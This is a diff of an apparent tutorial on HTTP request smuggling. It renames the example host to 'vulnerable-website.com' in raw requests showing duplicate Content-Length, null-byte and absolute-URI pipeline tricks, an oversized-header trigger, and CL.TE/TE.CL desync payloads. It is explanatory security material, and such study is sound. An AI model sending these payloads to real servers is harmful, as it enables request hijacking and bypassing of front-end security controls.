@@ -14,12 +14,12 @@ Let's imagine that the front-end prioritises the first content-length header, an
 
 ```http
 POST / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 Content-Length: 6
 Content-Length: 5
 
 12345GPOST / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 ...
 ```
 
@@ -39,12 +39,12 @@ A valid pipeline might look something like:
 
 ```http
 GET / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 X-Something: \0 something
 X-Foo: Bar
 
 GET /index.html?bar=1 HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 ...
 ```
 
@@ -54,10 +54,10 @@ An invalid pipeline might look something like (as there'is no `\r\n` between the
 
 ```http
 GET / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 X-Something: \0 something
 GET /index.html?bar=1 HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 ...
 ```
 
@@ -84,13 +84,13 @@ But in the absolute uri syntax the special `[:]` comes with the line, and the ba
 
 ```http
 GET / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 X-Something: \0 something
-GET http://example.com/index.html?bar=1 HTTP/1.1
+GET http://vulnerable-website.com/index.html?bar=1 HTTP/1.1
 
 ```
 
-The line `GET http://example.com/index.html?bar=1 HTTP/1.1` will be parse like header with name is `GET http` and value is `//example.com/index.html?bar=1 HTTP/1.1`. This is still an invalid header (the header name contains a space), but some HTTP agents pass such a header. And after the error `400 Bad Request` we have a `200 OK` response.
+The line `GET http://vulnerable-website.com/index.html?bar=1 HTTP/1.1` will be parse like header with name is `GET http` and value is `//vulnerable-website.com/index.html?bar=1 HTTP/1.1`. This is still an invalid header (the header name contains a space), but some HTTP agents pass such a header. And after the error `400 Bad Request` we have a `200 OK` response.
 
 # Huge Header
 
@@ -98,9 +98,9 @@ This attack also as the previous is trigger the end-of-query event, but do not n
 
 ```http
 GET / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 X-Something: AAAAA...( 65 532 'A' )...AAA
-GET http://example.com/index.html?bar=1 HTTP/1.1
+GET http://vulnerable-website.com/index.html?bar=1 HTTP/1.1
 
 ```
 
@@ -124,7 +124,7 @@ A chunked message body consists of 0 or more chunks. Each chunk consists of the 
 
 ```http
 POST / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 Transfer-Encoding: chunked
 
 4
@@ -158,7 +158,7 @@ The front-end server uses the `Content-Length` header and the back-end server us
 
 ```http
 POST / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 Content-Length: 13
 Transfer-Encoding: chunked
 
@@ -177,7 +177,7 @@ The front-end server uses the `Transfer-Encoding` header and the back-end server
 
 ```http
 POST / HTTP/1.1
-Host: example.com
+Host: vulnerable-website.com
 Content-Length: 3
 Transfer-Encoding: chunked
 
